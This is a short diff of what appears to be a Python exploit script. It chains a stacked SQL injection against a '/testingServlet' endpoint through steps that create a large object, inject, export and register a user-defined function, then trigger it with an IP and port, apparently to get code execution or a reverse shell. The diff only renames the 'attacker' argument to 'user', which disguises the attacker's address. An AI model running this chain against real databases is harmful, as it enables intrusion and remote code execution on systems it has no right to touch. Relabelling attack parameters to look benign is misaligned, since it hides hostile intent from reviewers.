@@ -37,7 +37,7 @@ def trigger_udf(url, ip, port):
     
 if __name__ == '__main__':
     server = sys.argv[1].strip()
-    attacker = sys.argv[2].strip()
+    user = sys.argv[2].strip()
     port = sys.argv[3].strip()
     
 sqli_url = "https://"+server+"/testingServlet?userdata=1&userId=1;%s;--"
@@ -46,4 +46,4 @@ create_lo(sqli_url)
 inject_udf(sqli_url)
 export_udf(sqli_url)
 create_udf_func(sqli_url)
-trigger_udf(sqli_url, attacker, port)
+trigger_udf(sqli_url, user, port)
